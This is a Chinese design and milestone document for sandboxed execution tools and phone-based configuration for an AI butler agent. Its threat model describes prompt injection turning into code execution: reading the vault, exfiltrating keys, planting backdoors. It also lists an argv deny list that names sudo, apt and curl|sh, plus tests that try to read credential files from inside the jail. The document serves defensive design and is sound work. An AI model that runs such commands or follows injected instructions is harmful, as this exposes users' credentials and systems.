# 阿同执行能力 track（HANDS）— 给阿同一双关在监狱里的手，配置动作搬到手机上

> Status: **M0→M7 全完（2026-08-20）**——侦察 + 威胁模型 + 四档策略 + 五岔口拍板 +
> 里程碑 M1→M7 全部落地。落地记录：M1 §九 · M2 §十（真 spawn 门全过 + Codex 交叉审九轮
> 5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L → 2H/2M/1L → 2H/2M/3L → 3H/2M/3L →
> 3H/5M/6L + 内部对抗审一轮 2H/2M，全部修入，见 §10.5/§10.7）· M2b §十一 · M3a §十二 ·
> M3b §十三 · M3c §十四 · M4 §十五 · M5 §十六 · M6 §十七 · M7 §十八。
> **M2/M2b/M3a/M3b/M3c/M4/M5/M6/M7 的 Codex 交叉审同批待跑**（额度 08-19 恢复）。
> Last updated: 2026-08-20
>
> 用户诉求（2026-08-15 原话）：「我们要增强 atong 的执行能力，比如说增加手机可执行
> 命令。理想形态是在服务器里一键镜像完成部署，完成 im 通道后包括配 api-key 这种指令也
> 可以手机用 `/`+xxx 指令配置，拥有自行检测所在环境（根据服务器资源及用户批准决定后续
> 配置方案）、配脚手架能力、增强修复能力。将指令等级升级，涉及到 atong 自身运行基础设施
> 及凭证的文件需要人参与管理至少要确认，其他的分级自行写文件以 obsidian 类似的方式来管理
> 自己的任务和记忆和任务，甚至配开发环境、是否可行？」
>
> 前置：2026-08-14 顶级智能体对标（Manus / OpenAI Agent / Genspark 等）结论——阿同的
> 差距在**执行肢体**（沙箱、浏览器、交付物形态、多小时自治），不在神经系统（记忆 / 治理 /
> 多用户 / 联邦 / IM 原生）。本 track 只补「肢体」里与北极星相容的那一半：**关在监狱里的
> 手 + 手机上的配置面**；浏览器自动化与每任务云 VM 显式不做（见 §七）。

---

## 一、结论先行：可行，且七成是装配

用户问的六件事逐条对到仓里**已经有**的东西（file:line 都是 2026-08-15 一手核）：

| 诉求 | 今天有什么 | 差什么 |
|---|---|---|
| ① 手机 `/` 指令配置 | IM 命令面 `/help /bind /inbox /approve /deny /setting`（`packages/im-adapter/src/command-parser.ts:69-107`，`host/src/im-bridge.ts:319-471`）；`setting` 运维台三入口一个咽喉 `runOpsCommand`（`host/src/ops-core.ts:536-562`），四档 `OpsTier = read \| safe-mutate \| config-write \| destructive-offline`（`:84`），**IM 只开 read+safe-mutate，config-write 在 IM 上刻意 ✗**（`docs/zh/SETTING-OPS-CONSOLE.md:33-60`） | 配 key / 换模型这类 config-write 在手机上的**两步确认**路径；`/setkey` 的凭证录入路径 |
| ② 配 api-key | 三条既有录入路：admin 面板 / `gotong model` 走 `PUT /api/admin/agents/:id`（key 进金库）/ 向导；一次性链接机制先例（`?token=` 固定攻击防御 `web/src/server.ts:1078-1100`、设备配对码 80-bit 单次 10min、IM 绑定 6 位码、邀请令牌只显示一次 `identity-routes.ts:1378,1522`） | 手机端的**凭证录入口**（岔口 2 已拍：保留现方式 + 允许聊天直贴 + 告知优劣） |
| ③ 自行检测环境→按资源和用户批准定方案 | RES track 只读探测→提案→人批准应用（`docs/zh/RES-RESOURCE-ADAPTATION.md:27-56`，`applicable` 两态、apply 走 admin 路由）；`detectFsJail` 功能性探针（`core/src/workspace-jail-detect.ts:64`）；SEN `my_status`/`hub_health` | 探测面从「LLM 资源」推广到「机器资源 + 工具链」；方案应用走分级闸 |
| ④ 配脚手架 / 配开发环境 | 文件系统监狱纯核 `wrapWithFsJail`（`core/src/workspace-jail.ts:246`，bwrap/sandbox-exec 两内核，`buildBwrapArgs` `:299`：`--ro-bind / /`、`--tmpfs /tmp`、可写根逐个 `--bind`）；两个消费者 = `cli-agent/src/cli-runner.ts:102`、`acp-agent/src/acp-session.ts:428` | **阿同自己没有手**——没有任何工具能在监狱里跑命令 / 写工作区；监狱今天只护外驱 CLI agent |
| ⑤ 增强修复能力 | 诊断闭环 BE-M4、`fix-dirs`/`cold-start` 运维命令、AFR 医生卡、RES apply | 「能诊断」到「能动手修」之间缺分级的修复动作目录 |
| ⑥ 指令分级：基础设施/凭证文件人参与、其余自行写 | 治理闸 `GovernedActionToolset` 服务端权威 allow/approve/refuse，`classify` 可注入（`personal-butler/src/governed-toolset.ts:54,90-95,146`）；IMA 手机可批白名单按名字形状 fail-closed（`host/src/personal-butler-escalation.ts:89-96`）；LIB 知识树 `.md` 已是 Obsidian 可直接打开的目录（`knowledge/`，200 文件/32KB/4MB/6 深） | 一张**统一的写目标/命令四档表**把散落的分级（OpsTier / governed / IMA）收成一个策略；Obsidian 投影层 |
| 一键镜像部署 | `Dockerfile` + `docker-compose.yml`（env `:43`）+ `docker-compose.prod.yml`（`:67,:146`）+ `deploy/`（Caddyfile / systemd / watchdog / cloud-quickstart） | IM token 作为部署期 env 一次到位（手机优先的鸡生蛋）；e2e 门 |

**判定**：真正要新造的只有三件——(a) 关在监狱里的手（工具面 + 上限 + opt-in），(b) 统一四档策略
（一个纯核，所有写/执行动作都问它），(c) 手机端凭证录入路径 + config-write 两步确认。其余是把
既有件按同一张表接线。

---

## 二、五岔口拍板记录（2026-08-15，用户原话「1=两者；2=保留目前方式，允许聊天直贴，告知用户两种方式优劣；3=每次park；4=md 投影层、JSON 仍是真相；5=hub 同机监狱」）

| # | 岔口 | 拍板 | 落地含义 |
|---|---|---|---|
| 1 | 手的形态：原生确定性执行工具（阿同做脑） vs 外驱 CLI coding agent（cli-agent 五缝） | **两者** | M2 先做原生手（零新依赖、阿同直接用）；M2b 把 Claude Code / Codex / Aider 经 `@gotong/cli-agent` 接成兄弟参与者干重活，**共用同一个成员工作区**，阿同经 escalate 同型转派 |
| 2 | api-key 录入：只走网页/一次性链接 vs 允许 IM 直贴 | **保留目前方式，允许聊天直贴，告知优劣** | `/setkey` 双路径：(a) 直贴 `/setkey <目标> <key>`；(b) `/setkey link` 出一次性链接。**每次回复都附优劣文案**（直贴=快、零跳转，但 IM 平台服务器可见你的 key 且聊天记录留底；链接=key 只走 TLS 到你自己的 hub，平台看不见，多一步跳转） |
| 3 | 阿同自身基础设施（tier 2）动作：每次 park vs 项目级一次授权 | **每次 park** | tier 2 动作一律 approve，无 blanket grant；批准走 IMA 手机短码（hub 内配置动作本就 `imApprovable`） |
| 4 | Obsidian：重写记忆引擎成 md 库 vs md 投影 | **md 投影层，JSON 仍是真相** | tasks.json / semantic.jsonl 等真相不动；投影 `tasks.md`、`memory/*.md`（frontmatter + `[[wikilink]]` 指知识笔记），标「自动生成，改了会被覆盖」 |
| 5 | 执行位置：hub 同机监狱 vs 独立容器/云 VM | **hub 同机监狱** | 复用 `wrapWithFsJail`（bwrap / sandbox-exec），可写根=成员工作区 + tmp，`<space>/` 配置区**结构性不在可写根**；监狱缺席=手不装（fail-closed） |

---

## 三、威胁模型：为什么「手」必须先关起来

阿同是被注入面最宽的参与者：IM 消息、搜索结果、信封 payload、连接器返回、群聊里别人的话
全是 observed content，都能进它的上下文。今天最坏后果是「park 一个坏动作等人批」；一旦给它
`run_command`，**注入即 RCE**：读 vault / 外传 key / 装后门 / 填盘 / 挖矿。四道防线缺一不可：

1. **监狱**（结构性）：可写根只有成员工作区（`<space>/butler/hands/user/<userId>/workspace/`，
   `assertSafeOwnerId` 先于任何拼接）与 tmpfs；`<space>/`（agents.json / vault / 钥 / gotong.env /
   identity.sqlite）以只读 bind 进监狱**都不行**——它们含凭证，读了就等于泄。故 M2 监狱 **不 bind
   `<space>`**（bwrap `--ro-bind / /` 是全盘只读——`<space>` 在盘上，须显式 `--tmpfs` 盖掉或改成
   最小可读根白名单；M2 细化时以「进程 `cat <space>/gotong.env` 必须失败」为门）。网络默认
   `--unshare-net`（`buildBwrapArgs` 今天不隔网，`:276` 注释「network, and exec stay allowed」是给
   外驱 coding agent 留的——**手 A 的默认与之相反**）。
2. **四档策略**（服务端权威，fail-closed）：见 §四。未知一律不 allow。
3. **凭证结构性缺席**：阿同没有任何工具能读/写凭证**值**（只见名字/槽位/有无）；`/setkey` 直贴
   由桥层截获直接进金库，**不进阿同上下文、不进 SESS 会话窗、不进 transcript**，回复不回显。
4. **审计 + 上限**：每次执行落审计行（argv/cwd/出码/时长/字节数，不落 stdout 全文）；单命令
   时长 ≤120s、输出尾巴 ≤32KB、工作区总量 ≤512MB、并发 1/成员；超限响亮拒。

**残余（如实）**：监狱内资源滥用靠上限兜（bwrap 不做 cgroup）；bwrap 依赖非特权 userns
（Ubuntu 23.10+ 默认 AppArmor 限制非特权 userns，部署时可能要 `sysctl
kernel.apparmor_restrict_unprivileged_userns=0` 或 setuid bwrap——M2 探针须能诊断并说人话）；
macOS `sandbox-exec` 已弃用但可用；hub 非 root ⇒ `apt`/`systemctl` 结构性做不了（这是**特性**：
系统级动作留给人，阿同只能「指路」）。

---

## 四、设计

### 4.1 统一四档表（所有写目标 / 命令都问同一个策略）

| 档 | 对象 | 判定 | 谁批 | 说明 |
|---|---|---|---|---|
| **0 自留地** | 知识树 `knowledge/`、面板内容、任务笔记本、记忆、Obsidian 投影 | allow（经**各自既有工具**） | 无 | 只写本人展示/自用数据；**JSON 真相文件只经各自工具写**（TN/记忆的 schema、上限、id 保证都在工具里），raw 文件写这些路径 = refuse |
| **1 工作区** | 成员工作区内 `hands_write/read/list/rm`；监狱内 `hands_run`（**断网**） | allow | 无 | 装脚手架 / 写脚本 / 跑测试 / 建项目；监狱 + 上限兜底 |
| **2 阿同自身运行基础设施** | 联网执行（装依赖/拉代码）、`setting` config-write（`config-set/config-price`）、建改 agent/工作流（既有 governed 工具）、RES 方案应用、桥重连、模板安装 | approve（**每次 park**） | 本人（IM 短码 `/approve` 或 /me） | 走**类型化动作**不走 raw 文件写：agents.json / workflows/ 有校验器在工具里，raw 写它们 = refuse + 指路 |
| **3 凭证材料** | vault / master key / 签名钥 / bot token / gotong.env 值 / identity 库 / systemd unit / Caddyfile | refuse（结构性缺席 + 分类兜底） | 人亲手（`/setkey` 双路径 / 网页 / CLI） | 阿同只能「声明需要哪个变量名」（`request_env_var(NAME)` 出一张给人的卡），值永不经它 |

判定纯函数 `classifyHandsAction(action, ctx) → {tier, verdict:'allow'|'approve'|'refuse', reason}`
（`packages/personal-butler/src/hands-policy.ts`，host-free）：`write` 看解析后的绝对路径是否在
工作区内（`isInsideRoots` 同型，realpath 防符号链接逃逸）；`run` 看 `net` 标志（false→1，
true→2）+ 一小张 argv 前缀拒绝表（`sudo su apt apt-get systemctl docker mount` 与 `curl|sh`
形状——**做不了或不该做的直接拒，别浪费一次审批**）；其余一律按 fail-closed 落保守侧。
`verdict` 直接喂 `GovernedActionToolset.classify` 缝（`governed-toolset.ts:90`）。

### 4.2 手 A：原生确定性执行工具（M2）

`buildButlerHandsToolset({userId, hands})`（host `personal-butler-hands.ts`，AFR 注册三件套）：
`hands_run {argv, cwd?, stdin?, timeoutSec?, net?}` / `hands_write {path, content}` /
`hands_read {path}` / `hands_list {path?}` / `hands_rm {path}`。全部相对成员工作区
`<space>/butler/hands/user/<userId>/workspace/` 解析（`ownerDir` 先 `assertSafeOwnerId`）；
执行 = `wrapWithFsJail({writableRoots:[workspace], cwd, hardening:{unshareNet:!net, unsharePid:true,
hiddenPaths:[<space>, hub 用户 HOME, /home, /root, /run/user…], hiddenFiles:[/etc/gotong.env, docker/
podman 套接字…], readOnlyRoots:[落在 HOME 里的 node 前缀…], denySharedTmp:true}})` → spawn（**已落地
形状**：藏起来的树在监狱里「不存在」——bwrap `--tmpfs` 盖掉后再 `--bind` 工作区回去、`--ro-bind` 再放
开只读的工具链、末尾 `--remount-ro`；seatbelt `deny file-read* file-write* (subpath …)` 再重放行工作
区/只读根，后规则赢——见 §十）。**文件四动作也在同一座监狱里做**（监狱内的 node 小助手），hub 进程
自己从不以自己的权限碰工作区字节。
监狱探针 `detectFsJail` 结果 `kind:'none'` ⇒ **整套手不装**（fail-closed，B1 能力清单如实不列），
`my_status` 多一行「手：已装(bwrap)/未装(原因)」。opt-in file-first `<space>/hands.json`
`{enabled:true, allowRoles?:['owner','admin'], maxRunSec?, maxOutputBytes?, maxWorkspaceBytes?, hidden?:[绝对路径], readOnly?:[绝对路径]}`
（apns.json/fcm.json 同族三态
合同：缺席 OFF 字节不变 / 形状不对（坏 JSON、未知键、越界数值——区间 `HANDS_CONFIG_BOUNDS`
1–3600s / 1KB–1MB / 1MB–16GB，越界**不 clamp** 直接不装；`allowRoles` 认不出的角色名同样
不装，因为拼错一个字是**静默收紧**）warn+OFF / `enabled:false` info+OFF /
开了但监狱缺席 boot warn+OFF 并说明装法），**零新旋钮（116 冻结）**。
`allowRoles` **默认只 `owner`/`admin`**：`enabled:true` 打开的是命令执行，给成员一双手
得在文件里把 `member` 写进去（第十轮 H1，§10.7）；查不到成员角色（identity 缺席）⇒
整套手不装。审计行 + 每命令回执给
模型只带出码/尾巴/字节数。

### 4.3 手 B：外驱 CLI coding agent（M2b，opt-in）

owner 用既有 `@gotong/cli-agent` 把 Claude Code / Codex / Aider 接成兄弟参与者
（`docs/zh/ledger/V5-E2-CLI-ADAPTER.md` 五缝 + 动作闸），**可写根指到同一个成员工作区**（阿同写
需求文件、coder 改代码、阿同跑测试验收——文件就是接口）；阿同经 `escalate_to_expert` 同型
fire-and-forget 转派（`personal-butler-escalate.ts:118` explicit 直达），结果 pushToMember 推回。
需要机器上有该 CLI 及**用户自己的** key（M3 `/setkey` 也能录）；没有=不装。

**落地形状（M2b，见 §十一）**：`hands.json` 加一个 `coder` 块就装上，缺席=字节不变。

```jsonc
{
  "enabled": true,
  "allowRoles": ["owner"],
  "coder": {
    "userId": "u-owner",            // 必填:手 B 替谁干活。它的权限 ⊆ 这个人手 A 的权限
    "command": "claude",            // 必填:机器上的 coding CLI
    "args": ["-p", "--output-format", "text"],
    "promptVia": "stdin",           // stdin(默认) | arg(argv 里用 {prompt} 占位)
    "passEnv": ["ANTHROPIC_API_KEY"], // 环境变量的**名字**,值现从 hub 进程 env 取
    "agentId": "coder",             // 默认 coder
    "label": "阿同的手 B(代码)",
    "timeoutSec": 900,              // 默认 900,上限 7200
    "maxTurns": 1                   // 默认 1
  }
}
```

转派配方：给管家行配 `escalateTo: "coder"`（DUO 那条既有缝），阿同就能
`escalate_to_expert` 把「写个加法函数并配测试」交出去；手 B 在**同一个工作区**里改完，
阿同回头 `hands_run` 跑测试看结果——**文件就是接口**，两只手之间不需要任何新协议。

### 4.4 手机配置面（M3）

- **`/setkey`**：`/setkey <provider|agentId> <key>` 直贴（桥层截获 → 金库，与 admin API 同一写入
  服务；回复固定「已存入 · 请手动删除刚才那条消息」+ 优劣文案，平台支持时 best-effort 撤回原消
  息）/ `/setkey link` 出单次 10min 链接（设备配对码同族：`hands_credential_codes` 单用户单码，
  链接打开极简页 POST key + token，**不建会话**）。**发送方必须是绑定了 owner/admin 用户的 IM 身份**
  （im_bindings → userId → role），否则同 IM 命令面其他门一样「未启用」。
- **config-write 上手机 = 两步确认**：先回「将改 X→Y，回 `/approve <短码>` 确认」，短码走 IMA
  同一 pending 面；`destructive-offline` 仍 CLI-only。这是对 `SETTING-OPS-CONSOLE` 表
  「config-write ✗ IM」的**显式改口**——当年 ✗ 的理由是 IM 单步无确认，两步确认后理由消失；
  文档同刀改。
  > **M3c 实现修正**（写门时挖出来的结构性事实，见 §十四）：这里原本写的载体是
  > `/setting config-set K V` 这类**命令行**。做不到——`InboxItem.itemId` **就是**被挂起的
  > Task 的 id，而那条零 LLM 的命令行**没有 task 可挂**；让它 park 就得再造一个与
  > `HostInboxService.resolve` 平行的裁决权威。故落地形态改成**一件 governed 工具**
  > `set_hub_config`（对阿同说人话，它 park，你 `/approve`），命令台维持一步式不动。
  > 改口的那句话一个字没少，只是改口的**是哪条路**换了。
- **`/keys`** 列 key 有无（名字/槽位/有无/最后测试结果），永不列值。

### 4.5 环境探测 → 部署方案 → 人批（M4）

零 LLM 探针（cpu/mem/disk/node/ffmpeg/bwrap 或 sandbox-exec/docker/GPU/出网可达）折成
`hub_environment` benign 工具 + RES 同型**提案卡**（每条 `applicable` 两态：可自动应用的走 tier 2
approve，不能的写「你要做什么」指路）。典型：内存 <4GB ⇒ 建议关 embedder/单管家；无 ffmpeg ⇒
语音腿不可用 + 装法；无监狱 ⇒ 手不可用 + 装法；无出网 ⇒ 搜索/推送退化。**探针每轮零 LLM，
方案由阿同渲染，应用经闸**。

> **M0 → M4 改口（2026-08-17 落地，见 §十五）**：上面这段把「可自动应用」写宽了。真做一遍
> 才看清 —— hub 是**非特权**跑的（威胁模型里当特性写着的那条），装 ffmpeg、装监狱、清磁盘、
> 修防火墙**结构上都不是阿同能做的事**，一律落 `applicable:false` 只指路；而「关 embedder /
> 关图书馆员」那类开关**不在 M3c 那四个可改设置项的白名单里**，同样只能指路 —— 一张环境卡
> 不该顺手把那张白名单撑宽，那是另一个决定。真正 `applicable:true` 的只有一条：**两个端口被
> 写成了同一个**（正是 M3c 让手机能造出来的那个错），它落在 `set_hub_config` **已有**的参数
> 空间里，一个字节的新落盘路径都不需要。另两处改口：**GPU 不探**（探得到，但没有任何一条建议
> 由它决定，探了就是「写了永不读」）；**出网不主动探** —— 主动探一次就等于给模型开一个新的
> 出网面，改成读 CARE 那份从真实流量折叠出来的断供事实，并在卡上写明「被动看，不主动探」。

### 4.6 Obsidian 投影（M5 ✅ 已落，见 §十六）

`<ownerDir>/` 本就可被 Obsidian 当 vault 打开（`knowledge/` 是 md 树）。补三块只读投影：
`tasks.md`（从 tasks.json，含 `[[knowledge/...]]` 链）/ `memory/<cluster>.md`（事实摘要 + 出处）/
`STATUS.md` 已在。生成时机=各自写路径末尾 + 6h 维护兜底；frontmatter `generated: true`；
真相仍 JSON，投影被人改了下次覆盖（并在 STATUS 里提一句）。零 LLM。

落地时改口两处：**文件名叫 cluster 不叫 tier**（`memory/<tier>.md` 里的 tier 是记忆的**主题簇**
id，与「多级记忆」的 level 不是一回事，同一个词指两样东西会读错）；**记忆投影只在 6h 维护那一刻
重画**（语义事实本来就只在蒸馏时变，跟着每一次 capture 走只是白写盘）——tasks 才走「写路径末尾」，
因为笔记本每一次编辑都是一次真相变更。另加一条计划里没写、但决定了实现形状的判断：**投影里
一个 `Date.now()` 都不能有**（§16.1）。

### 4.7 一键镜像（M6）与修复接手（M7）

M6（✅ 2026-08-20 已落，见 §十七）：compose 加 IM token / provider key 的部署期 env 透传
（`GOTONG_TELEGRAM_BOT_TOKEN` / `GOTONG_LARK_*` / `GOTONG_WECHAT_BOT_TOKEN` 既有旋钮，
零新增），一次 `docker compose up` 后 IM 通道即在；**至少一次网页触碰不可避免也不该避免**
（owner 设密 + `/bind` 出码 = 身份锚），此后配置全在手机。镜像发布到 GHCR = 用户门。

~~验收行里的 `/model`~~ —— **这条改口**：`/model` 这个命令**不存在，而且不该造**（§17.1）。
手机上换模型今天就通，走的是 `edit_agent` 的 `changes.model` 字段 + `/approve <短码>`；再造
一条零 LLM 的 `/model` 命令去写 `agents.json`，等于给同一道闸开第二个执法点，正是 M3c 已经
裁决过不做的形状。故 M6 的验收改成 **`compose up` → IM 在 → 网页一次触碰 → 手机 `/setkey`
（金库）→ 手机说人话换模型（park → `/approve`）全通**。

M7（✅ 2026-08-20 已落，见 §十八）—— **这一条按 M4 的姿态重新过了一遍，结论是它不该是一族
新工具，而该是一张地图。** 计划里那七件「修复动作」逐条对着源码走完：`fix-dirs` 在一台已经在跑的
hub 上只能造一个空目录，补不上 M3c 造出来的任何一个失败模式；清缓存今天就是 tier 1 的
`hands_rm`；重拉桥要一条 stop-and-restart 的缝，而那条缝不存在（何况桥断着的时候，人根本收不到
那张 park 卡）；重连 MCP 没有 reconnect 这个操作；应用 RES 提案早就通了——`diagnose_my_agents`
的 `actionHint` 指向 governed `edit_agent`，再开第二条 apply 路，正是 M3c 判死过的「一道闸从此
有两个执法点」；换钥不再是指路人的活（`/setkey` 就是那条路）；改 unit 要 root，而 hub 刻意
非特权。**零新动作工具**，M7 的上半场落成 `gotong_guide` 的第 10 张卡 `repair`（§18.1）。

面包屑那句同样改口：**不往任何一条零 LLM 播报里塞第二个指针**——一条播报里两个指针互相稀释
＝噪音。「哪些我能自己动手、哪些要你点头」这层语义住在 `repair` 卡的正文里，由 `framework-map`
与 `workflow-failed` 两张卡各指一句过去；卡与卡之间互相指路，播报仍只带一个面包屑（§18.2）。

---

## 五、五条不可破边界

1. **手在监狱里，配置区结构性不在可写根；监狱缺席=手不装。** 绝不「没监狱先裸跑将来再关」。
2. **分级服务端权威、fail-closed。** 未知路径/未知形状永不 allow；JSON 真相文件只经各自工具写；
   tier 2 每次 park（岔口 3）。
3. **凭证值结构性不经阿同。** `/setkey` 直贴由桥层截获，不进上下文/会话窗/transcript，不回显；
   双路径每次附优劣文案；阿同只能声明变量名。
4. **opt-in file-first `<space>/hands.json`，未装字节不变，零新旋钮（116 冻结）。**
5. **北极星不动**：hub 不跑 LLM（手是阿同这个参与者的工具，探针零 LLM）；人和 agent 同一
   Participant（手 B 是兄弟参与者不是特权后门）；file-first；内核除 `workspace-jail` 加可选
   `unshareNet`（additive，既有调用者字节不变）外零改动。

---

## 六、里程碑

| # | 里程碑 | 交付 | 会红的门 |
|---|---|---|---|
| M0 | 本文 | 侦察 + 威胁模型 + 四档表 + 五岔口 | — |
| M1 | 四档策略纯核 | `personal-butler/src/hands-policy.ts` 纯函数 + 拒绝表 + realpath 逃逸判定 | 单测：配置区/凭证路径永不 allow；符号链接逃逸 refuse；`net:true`→approve；未知→非 allow；拒绝表命中 refuse |
| M2 ✅ | 手 A 原生（2026-08-15，见 §十） | host `personal-butler-hands.ts` 执行器 + 五工具（**文件四动作走监狱内 node 小助手**）+ `hands.json` opt-in（含 `allowRoles` **默认 owner/admin**、`hidden`/`readOnly` 追加清单）+ **HOME = 只读空目录**（缓存另指工作区）+ core `FsJailHardening`（`unshareNet`/`unsharePid`/`hiddenPaths`/`hiddenFiles`/`readOnlyRoots`/`denySharedTmp`，additive；seatbelt 侧 `unsharePid` 映射成进程隔离规则）+ 上限（含监狱内 `ulimit`）+ 审计（含 stdin 摘要/sha256）+ factory 接线 + AFR 三件套 + main.ts 棘轮显式抬（2768/2770→2772/2780）+ 备份排除工作区 `node_modules` | 真 spawn 门（host hands **82 例**全过，其中真 spawn 22；bwrap 靠 argv 单测）：`cat <space>/gotong.env` 在监狱内失败；写 `<space>/agents.json` 双拒（监狱 rc≠0 且字节不变 + hands_write 穿越 refuse）；hub 用户 HOME 与点名文件藏起来；策略放行后目录换成指向 `<space>` 的链接小助手照样写不进读不出（TOCTOU 真闸=监狱）；断网命令联本机 HTTP 失败、`net:true` approve 后成功；超时/超输出/洪水响亮；命令退出即收整个进程组；hub 级并发 1 响亮拒；`kind:'none'` 整套不装；缺席字节不变（脸 absent≡off≡armed−hands_*）；子环境零凭证且 TMPDIR 指进工作区；审计不落正文；**只有 owner/admin 有手**（默认；member 的脸上没有这五件、park 期间被降权也执行不了）；**HOME 是只读空目录**（在、列得动、是空的、写不进）；**Codex 交叉审九轮 + 内部对抗审一轮**（5H/4M/1L → 2H/6M/2L → 3H/3M → 3H/3M → 2H/1M/1L → 2H/2M/1L → 2H/2M/3L → 3H/2M/3L → 3H/5M/6L → 第十轮 2H/2M，§10.5/§10.7）✅ |
| M2b ✅ | 手 B 外驱（2026-08-16，见 §十一） | host `personal-butler-coder.ts` 装配（围墙全部借手 A 的 `ButlerHandsHost`，五道 fail-closed 闸）+ `hands.json` `coder` 块（形状门与手 A 同一个读者）+ 名册行 + owner 授权（`escalate_to_expert` 认的就是那张表）+ `onChunk` 播成 transcript 观察缝 + cli-agent `PerSpawn` env/fsJail thunk + **core seatbelt 补藏起来祖先的 `stat` 通路**（§11.2，macOS 独有的真洞） | e2e：**阿同写需求→手 B 改文件（真落在手 A 工作区）→阿同 `hands_run` 跑测试出 TESTS PASS**；手 B 读不到 hub 用户 HOME 的钥匙；坏 `coder` 块整份不装；不够格的成员连目录都不建；撞上别人的 agent 行不覆盖；`passEnv` 盖不掉 HOME/PATH/TMPDIR；围墙每次 spawn 现算（host coder **25 例** + 手 A 回归 1 + core 6；变异一道四例齐红） ✅ |
| M3a ✅ | 手机配置面·直贴（2026-08-17，见 §十二） | im-adapter `/setkey` 全形状认领 + host `im-credentials-service.ts`（写金库 + **写完重启那些真会换钥的 agent**）+ 桥两条 gated 路由 + `/keys` 槽位表（永不列值） | 单测 38：直贴不进 SESS 窗/transcript/日志/审计；**顺序打反（`/setkey <key> <agent>`）也不把 key 回显进聊天**；坏形状永不落回自由文本；非 owner/admin 与「没接」同一句；`env_pinned`/mock/`openai-compatible` 共享档拒绝而不是假装存上；优先级表由**真** `selectLlmApiKey` 推导对拍 |
| M3b ✅ | 手机配置面·链接（2026-08-17，见 §十三） | host `setkey-link-store.ts`（文件名 = `sha256(token)`，删除即认领）+ 服务四方法（`linkAvailable`/`issueLink`/`linkPage`/`submitLink`）+ web `setkey-routes.ts` 零 JavaScript 表单（**挂在 CSRF 门之前**）+ 双路径优劣文案 + **M3a 装配缝的死线修复** | 单测 60（存储 11 / 服务 +13 / 装配 6 / 路由 16 / 解析 +6）：令牌不在盘上任何一个字节里；单次；过期即废；页面是 peek 不是认领；写给**令牌的主人**而不是提交者；两处各自重问角色；秘密不出现在任何响应体（含重画表单那次）；无 cookie / bearer / CSRF 可达且**控制组先证那道门开着**；直贴与链接在审计里永远分得出来；`GOTONG_PUBLIC_URL` 缺席=整条路诚实缺席（不猜 `host:port`） |
| M3c ✅ | config-write 上手机（2026-08-17，见 §十四） | 一件 governed 工具 `set_hub_config`（tier 2「每次 park」）+ host `personal-butler-config.ts`（classify 预检 = `applyEnvKnob` 逐条同序）+ 进 `IM_APPROVABLE_TOOLS` + `OpsSurface` 第四个值 `butler` + SETTING-OPS-CONSOLE 「config-write ✗ IM」**显式改口**（并写清改的是哪条路） | 单测 24 + tiers 双向核对：枚举 ≡ `ENV_KNOBS`（参数空间封闭 = IM 可批的理由）/ 角色在最前（先于任何参数判断）/ 密钥键指 `/setkey` 而不是「不是可改的设置项」/ 读现值失败**不变成拒绝**（`GovernedActionToolset.classify` 无 catch）/ park→批准之间被降权则不执行 / 真写真审计且审计抛错不回滚已落的字节 / 同样 `surface:'butler'` 不带 `allowConfigWrite` 照样 `OpsTierError`；**五道变异五次全红且只红该红那一例**；**Codex 交叉审**（与 M2/M2b 同批，额度 08-19 恢复） |
| M4 ✅ | 环境探测→方案→人批（2026-08-17，见 §十五） | host `personal-butler-environment.ts`：零 spawn 零联网探针（cpu/mem/disk/node/PATH 上的 ffmpeg·git·docker）+ 复用 boot 那次监狱功能探测的结论 + 被动读 CARE 断供 + 纯函数提案引擎（判别联合：`applicable:false` 那一支**结构上没有 apply 字段**）+ 渲染卡；进目录层 benign（~193tk，不占每轮脸）；`spaceRoot` 穿一行进 factory 只为 statfs | 单测 30（六组）：schema 封闭 + 描述如实说「不跑任何命令 / 不发任何网络请求」；**源码级断言**剥掉注释后不含 `child_process`/`spawn(`/`execFile`/`fetch(`/`node:http`；每一块读不动只让那一块 null 且**不产生提案**（null ≠ 有问题）；磁盘探不动不当成 0；端口撞车两支（能算出安全值⇒指向 `set_hub_config`；活值也撞⇒降级只指路）；凡 `applicable:true` 其 `apply.tool` 恒为 `set_hub_config` 且 key ∈ 四个白名单旋钮；渲染里**结构性没有**绝对路径/用户名（真跑默认探针对拍）；**七道变异七次全红且只红该红那些**（含摘掉判别联合、摘掉 tiers 登记、摘掉 AFR tripwire） |
| M5 ✅ | Obsidian 投影 | tasks.md / memory/*.md 生成 + frontmatter + 覆盖语义 | 真相未动；投影可 Obsidian 解析 |
| M6 ✅ | 一键镜像（2026-08-20，见 §十七） | 两份 compose 补 13 个 IM 变量 + 两个 provider key 的部署期透传（**空值键**：宿主没设就不进容器 ⇒ 未设时逐字节不变，且值永远不进 git）+ 验收行 `/model` **显式改口**（那个命令不存在也不该造，换模型走 `edit_agent` + `/approve`） | 单测 12（两半）：**文本半**——变量名从 `im-bridge.ts` **源码**扒出来（不是手抄清单），两份 compose 一个不少；凡像凭证的键（判据复用 `set_hub_config` 拒写秘密的**同一个** `isSecretKey`）值只能是空或 `${VAR}` 插值，绝不是字面量；发布出去的 `ports:` 与 `GOTONG_WEB_PORT`/`_WS_PORT` 对得上。**行为半**——拿**真** `startImBridges` 跑装配层：三座可金库的桥从 env 起来（`source:'env'`）；13 个全设成空串 ⇒ 一座不起；**空串永远盖不掉金库里的凭证**；`selectLlmApiKey` 里空串等于没设、手机 `/setkey` 的 per-agent 那把压得住 compose 的。**五道变异五次全红且只红该红那些** |
| M7 ✅ | 修复接手 + capstone（2026-08-20，见 §十八） | **零新动作工具**（七件「修复动作」逐条对着源码走完，答案是「早就有，散在七处」）→ `gotong_guide` 第 10 张卡 `repair`（四档修复地图，457tk/500tk；卡量 10 = 门的上限）+ `framework-map`/`workflow-failed` 各指一句过去（**播报仍只带一个面包屑**）+ 把 `DELETE_YOUR_MESSAGE`/`renderSetKeyOutcome` 从 `im-bridge.ts` 挪进 `im-credentials-service.ts` 并开两条子路径导出，使 capstone 渲染的**是生产那一份字节** + `examples/atong-hands` 五幕 | `pnpm demo:atong-hands` exit 0（**36 条断言**，零网络零 key 零 LLM）：幕 0 监狱缺席 / 角色查不到 ⇒ 手根本不装；幕 1 注入写配置**两层各拒一次**且 `agents.json` 逐字节不变；幕 2 `net:true` park，**批准前盘上零痕迹**，批准后真跑完；幕 3 工作区直写不 park + 监狱里 `node test.js` 真出 `TESTS PASS`；幕 4 秘密只到金库（`readVaultSecret` 解得出、整个 `<space>` 逐字节扫不到明文、渲染/日志/审计零回显，含**顺序打反**那次）；**幕 1 与幕 3 各配一条控制组**，不让「够不到」空洞地真 |

